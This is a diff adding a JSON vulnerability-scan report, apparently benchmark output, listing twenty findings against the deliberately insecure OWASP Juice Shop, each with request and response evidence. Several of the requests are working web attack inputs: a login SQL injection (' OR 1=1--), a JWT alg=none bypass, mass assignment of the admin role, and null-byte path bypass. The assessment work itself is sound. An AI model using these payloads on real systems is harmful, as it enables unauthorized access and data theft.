@@ -1,0 +1,254 @@
+{
+  "tool": "dsh-vapt",
+  "app": "juice-shop",
+  "appsRun": [
+    "juice-shop"
+  ],
+  "observations": [
+    {
+      "itemId": "JS-01",
+      "app": "juice-shop",
+      "path": "/rest/products/search",
+      "param": "q",
+      "title": "SQL injection in product search (q)",
+      "severity": "critical",
+      "evidence": {
+        "request": "GET /rest/products/search?q=')) HTTP/1.1",
+        "response": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: SQLITE_ERROR: near &quot;)&quot;: syntax error</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n  font: 13px \"Helvetica Neue\", \"Lucida Grande\", \"Arial\";\n  background: #ECE9E9 -webkit-gradien",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-02",
+      "app": "juice-shop",
+      "path": "/rest/admin/application-configuration",
+      "title": "Admin configuration readable without authentication",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /rest/admin/application-configuration HTTP/1.1",
+        "response": "{\"config\":{\"server\":{\"port\":3000,\"basePath\":\"\",\"baseUrl\":\"http://localhost:3000\"},\"application\":{\"domain\":\"juice-sh.op\",\"name\":\"OWASP Juice Shop\",\"logo\":\"JuiceShop_Logo.png\",\"favicon\":\"favicon_js.ico\",\"theme\":\"bluegrey-lightgreen\",\"showVersionNumber\":true,\"showGitHubLinks\":true,\"localBackupEnabled\":",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-03",
+      "app": "juice-shop",
+      "path": "/rest/memories",
+      "title": "Unprotected /rest/memories leaks user photos and emails",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /rest/memories HTTP/1.1",
+        "response": "{\"status\":\"success\",\"data\":[{\"UserId\":13,\"id\":1,\"caption\":\"😼 #zatschi #whoneedsfourlegs\",\"imagePath\":\"assets/public/images/uploads/ᓚᘏᗢ-#zatschi-#whoneedsfourlegs-1572600969477.jpg\",\"createdAt\":\"2026-11-22T09:17:11.936Z\",\"updatedAt\":\"2026-11-22T09:17:11.936Z\",\"User\":{\"id\":13,\"username\":\"\",\"email\":\"b",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-04",
+      "app": "juice-shop",
+      "path": "/ftp/",
+      "title": "Directory listing on /ftp exposes backup files",
+      "severity": "medium",
+      "evidence": {
+        "request": "GET /ftp/ HTTP/1.1",
+        "response": "<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset='utf-8'> \n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no\" />\n    <title>listing directory /ftp/</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 1",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-05",
+      "app": "juice-shop",
+      "path": "/",
+      "kind": "headers",
+      "title": "Missing CSP and HSTS headers",
+      "severity": "low",
+      "evidence": {
+        "request": "GET / HTTP/1.1",
+        "response": "missing: content-security-policy, strict-transport-security",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-06",
+      "app": "juice-shop",
+      "path": "/rest/user/login",
+      "title": "Authentication bypass via SQL injection on /rest/user/login",
+      "severity": "critical",
+      "evidence": {
+        "request": "POST /rest/user/login {\"email\":\"' OR 1=1--\",\"password\":\"x\"}",
+        "response": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoxLCJ1c2VybmFtZSI6IiIsImVtYWlsIjoiYWRtaW5AanVpY2Utc2gub3AiLCJwYXNzd29yZCI6IjAxOTIwMjNhN2JiZDczMjUwNTE2ZjA2OWRmMThiNTA",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-07",
+      "app": "juice-shop",
+      "path": "/api/Products/1",
+      "title": "Unauthenticated product modification via PUT /api/Products/{id}",
+      "severity": "critical",
+      "evidence": {
+        "request": "PUT /api/Products/1 {\"name\":\"bench-marker\"}",
+        "response": "{\"status\":\"success\",\"data\":{\"id\":1,\"name\":\"bench-marker\",\"description\":\"The all-time classic.\",\"price\":1.99,\"deluxePrice\":0.99,\"image\":\"apple_juice.jpg\",\"alternateImages\":[{\"file\":\"apple_juice-1x.avif",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-08",
+      "app": "juice-shop",
+      "path": "/api/Users",
+      "title": "Mass assignment: self-registration with role=admin",
+      "severity": "critical",
+      "evidence": {
+        "request": "POST /api/Users {email,password,role:\"admin\"}",
+        "response": "register=201 role=admin",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-09",
+      "app": "juice-shop",
+      "path": "/api/Users",
+      "kind": "jwt",
+      "title": "JWT alg=none accepted by /api/Users",
+      "severity": "critical",
+      "evidence": {
+        "request": "GET /api/Users (Authorization: Bearer <alg=none token>)",
+        "response": "{\"status\":\"success\",\"data\":[{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\"",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-10",
+      "app": "juice-shop",
+      "path": "/ftp/package.json.bak%2500.md",
+      "title": "Null-byte extension bypass on /ftp exposes package.json.bak",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /ftp/package.json.bak%2500.md HTTP/1.1",
+        "response": "{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\",\n  \"description\": \"An intentionally insecure JavaScript Web Application\",\n  \"homepage\": \"http://owasp-juice.shop\",\n  \"author\": \"Björn Kimminich ",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-11",
+      "app": "juice-shop",
+      "path": "/api/Users",
+      "kind": "enumeration",
+      "title": "Any customer token can enumerate all users via /api/Users",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /api/Users (customer token)",
+        "response": "{\"status\":\"success\",\"data\":[{\"id\":1,\"username\":\"\",\"email\":\"admin@juice-sh.op\",\"role\":\"admin\",\"deluxeToken\":\"\",\"lastLoginIp\":\"\",\"profileImage\":\"assets/public/images/uploads/defaultAdmin.png\",\"isActive\"",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-12",
+      "app": "juice-shop",
+      "path": "/metrics",
+      "title": "Prometheus /metrics exposed without authentication",
+      "severity": "medium",
+      "evidence": {
+        "request": "GET /metrics HTTP/1.1",
+        "response": "# HELP juiceshop_llm_input_tokens_total Number of total input tokens processed\n# TYPE juiceshop_llm_input_tokens_total counter\njuiceshop_llm_input_tokens_total{",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-13",
+      "app": "juice-shop",
+      "path": "/support/logs/",
+      "title": "Directory listing on /support/logs exposes access logs",
+      "severity": "medium",
+      "evidence": {
+        "request": "GET /support/logs/ HTTP/1.1",
+        "response": "<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset='utf-8'> \n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0, maximum-scale=1.0, user-sc",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-14",
+      "app": "juice-shop",
+      "path": "/api/Products/1/reviews",
+      "title": "Error stack disclosure on /api/Products/{id}/reviews",
+      "severity": "low",
+      "evidence": {
+        "request": "GET /api/Products/1/reviews HTTP/1.1",
+        "response": "<html>\n  <head>\n    <meta charset='utf-8'> \n    <title>Error: Unexpected path: /api/Products/1/reviews</title>\n    <style>* {\n  margin: 0;\n  padding: 0;\n  outline: 0;\n}\n\nbody {\n  padding: 80px 100px;\n",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-15",
+      "app": "juice-shop",
+      "path": "/rest/user/login",
+      "kind": "jwt",
+      "title": "JWT payload carries the password hash",
+      "severity": "medium",
+      "evidence": {
+        "request": "POST /rest/user/login (decode JWT payload)",
+        "response": "{\"id\":28,\"username\":\"\",\"email\":\"bench1795339033007j@t.local\",\"password\":\"47b7bfb65fa83ac9a71dcb0f6296bb6e\",\"role\":\"customer\",\"deluxeToken\":\"\",\"lastLoginIp\":\"0.0.0.0\",\"profileImage\":\"/assets/public/ima",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-16",
+      "app": "juice-shop",
+      "path": "/rest/basket/1",
+      "title": "Basket BOLA: any customer token reads other baskets",
+      "severity": "high",
+      "evidence": {
+        "request": "GET /rest/basket/1 (customer token)",
+        "response": "{\"status\":\"success\",\"data\":{\"id\":1,\"coupon\":null,\"UserId\":1,\"createdAt\":\"2026-11-22T09:17:11.742Z\",\"updatedAt\":\"2026-11-22T09:17:11.742Z\",\"Products\":[{\"id\":1,\"name\":\"bench-marker\",\"description\":\"The a",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-17",
+      "app": "juice-shop",
+      "path": "/api/Products",
+      "title": "Customer token can create products",
+      "severity": "high",
+      "evidence": {
+        "request": "POST /api/Products (customer token)",
+        "response": "{\"status\":\"success\",\"data\":{\"id\":57,\"name\":\"bench-item\",\"price\":1,\"description\":\"bench\",\"updatedAt\":\"2026-11-22T09:17:13.094Z\",\"createdAt\":\"2026-11-22T09:17:13.094Z\",\"deluxePrice\":null,\"image\":null,\"a",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-18",
+      "app": "juice-shop",
+      "path": "/rest/deluxe-membership",
+      "title": "Free deluxe membership via paymentMode \"none\"",
+      "severity": "high",
+      "evidence": {
+        "request": "POST /rest/deluxe-membership {paymentMode:\"none\"}",
+        "response": "{\"status\":\"success\",\"data\":{\"confirmation\":\"Congratulations! You are now a deluxe member!\",\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MzEsInVzZXJuYW1lIjo",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-19",
+      "app": "juice-shop",
+      "path": "/rest/user/security-question",
+      "title": "Security-question endpoint enumerates registered emails",
+      "severity": "low",
+      "evidence": {
+        "request": "GET /rest/user/security-question?email=...",
+        "response": "{\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\",\"createdAt\":\"2026-11-22T09:17:11.272Z\",\"updatedAt\":\"2026-11-22T09:17:11.272Z\"}}",
+        "sha256": "recorded-by-store"
+      }
+    },
+    {
+      "itemId": "JS-20",
+      "app": "juice-shop",
+      "path": "/api/BasketItems",
+      "title": "Negative basket quantity accepted",
+      "severity": "medium",
+      "evidence": {
+        "request": "PUT /api/BasketItems/{id} {quantity:-100}",
+        "response": "{\"status\":\"success\",\"data\":{\"ProductId\":1,\"BasketId\":null,\"id\":9,\"quantity\":-100,\"createdAt\":\"2026-11-22T09:17:13.188Z\",\"updatedAt\":\"2026-11-22T09:17:13.201Z\"}}",
+        "sha256": "recorded-by-store"
+      }
+    }
+  ]
+}
